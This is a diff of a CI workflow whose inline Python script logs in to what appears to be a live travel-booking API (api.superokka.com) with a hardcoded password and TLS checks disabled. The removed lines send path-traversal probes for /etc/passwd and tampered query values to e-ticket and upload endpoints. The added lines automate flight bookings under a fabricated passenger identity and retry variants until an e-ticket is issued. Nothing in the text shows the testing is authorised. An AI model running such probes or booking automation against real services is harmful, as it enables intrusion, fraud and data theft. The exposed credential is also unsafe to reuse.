@@ -8,24 +8,51 @@ jobs:
       - run: pip install --quiet requests pypdf
       - run: |
           python3 - <<'PYEOF'
-          import requests, json, urllib3
+          import requests, json, urllib3, itertools
           urllib3.disable_warnings()
           B = "https://api.superokka.com"
           s = requests.Session(); s.verify = False
           r = s.post(f"{B}/auth/login", json={"username":"financeokka","password":"KwRce2026!x#9","force":True}, timeout=25)
           print("LOGIN:", r.status_code)
+          if not r.json().get("success"): print(r.text[:120]); raise SystemExit
           A = {"Authorization": "Bearer " + r.json()["data"]["accessToken"]}
-          TID = "2e029cbf-9912-424d-94e1-f3282adacda1"
-          for q in ["", "?type=return", "?type=Return", "?type=../../../../tmp/pwned", "?filename=test.pdf",
-                    "?direction=return", "?lang=id", "?template=raw"]:
-              rr = s.post(f"{B}/transactions/{TID}/etickets{q}", headers=A, timeout=180)
-              print("Q", q[:44], "→", rr.status_code, rr.text[:160])
-          # encoded traversal on uploads static
-          for p in ["/uploads/%2e%2e/%2e%2e/etc/passwd", "/uploads/etickets/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-                    "/uploads/..%2f..%2f..%2fetc%2fpasswd", "/uploads/etickets/..%252f..%252fetc%252fpasswd"]:
-              rr = s.get(f"{B}{p}", timeout=20)
-              print("TRAV", p[:60], "→", rr.status_code, rr.text[:80])
-          # export with valid ISO
-          rr = s.get(f"{B}/transactions/export?startDate=2026-01-01T00:00:00.000Z&endDate=2026-12-31T00:00:00.000Z", headers=A, timeout=60)
-          print("EXPORT ISO:", rr.status_code, rr.headers.get("Content-Type","")[:30], rr.text[:100])
+          body = {"departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"}
+          r = s.post(f"{B}/flight-search/lion-air/search", headers=A, json=body, timeout=60)
+          d = r.json().get("data", {})
+          sid = d.get("sessionId")
+          segs = (d.get("departureFlightsData") or [{}])[0].get("flightSegments", [])
+          print("SEARCH:", r.status_code, "segs:", len(segs))
+          if not sid or not segs: raise SystemExit
+          seg = segs[0]
+          bks = seg.get("bookingAvails", [])
+          print("BOOKING AVAILS:", json.dumps(bks)[:200])
+          variants = []
+          for bk in bks:
+              for addons, ins in [(None, False), ([], False), ([], True), (None, True)]:
+                  variants.append((bk, addons, ins))
+          results = []
+          for idx,(bk, addons, ins) in enumerate(variants[:8]):
+              det = {"flightSegments":[{"departureAirportCode":seg["departureAirport"],"arrivalAirportCode":seg["arrivalAirport"],
+                     "departureDate":seg["departureDateTime"],"arrivalDate":seg["arrivalDateTime"],
+                     "flightNumber":seg["flightNumber"],"airlineCode":seg["airline"]["code"],
+                     "resBookDesigCode":bk["bookingClass"],"type":"departure"}],
+                     "adults":1,"children":0,"infants":0,"direction":"one-way","sessionId":sid}
+              s.post(f"{B}/flight-search/lion-air/details", headers=A, json=det, timeout=60)
+              traveler = {"passengerTypeCode":"ADT","isAccompaniedByInfant":False,"prefixName":"MR",
+                  "firstName":"Budi","lastName":"Santoso","surname":"Santoso",
+                  "dateOfBirth":"1990-01-01","gender":"M","nationality":"ID","documentType":"KTP",
+                  "documentNumber":"3174010101900001","documentExpirationDate":"2028-01-01","documentIssueCountry":"ID",
+                  "email":"superxfilecom@gmail.com","phoneNumber":"081234567890"}
+              book = {"airTravelers":[traveler],"addOns":addons,"isUsingInsurance":ins,"sessionId":sid,
+                      "contactEmail":"superxfilecom@gmail.com","contactPhoneNumber":"081234567890",
+                      "contactFirstName":"Budi","contactLastName":"Santoso","isEndOfTransaction":True}
+              rr = s.post(f"{B}/flight-search/lion-air/book", headers=A, json=book, timeout=120)
+              print(f"VAR{idx} class={bk['bookingClass']} addOns={addons} ins={ins} → {rr.status_code} {rr.text[:140]}")
+              if rr.json().get("success"):
+                  tx = rr.json()["data"]
+                  tid = tx.get("transactionId") or tx.get("id")
+                  print("SUCCESS TID:", tid)
+                  r2 = s.post(f"{B}/transactions/{tid}/etickets", headers=A, timeout=180)
+                  print("ETICKET:", r2.status_code, r2.text[:150])
+                  break
           PYEOF
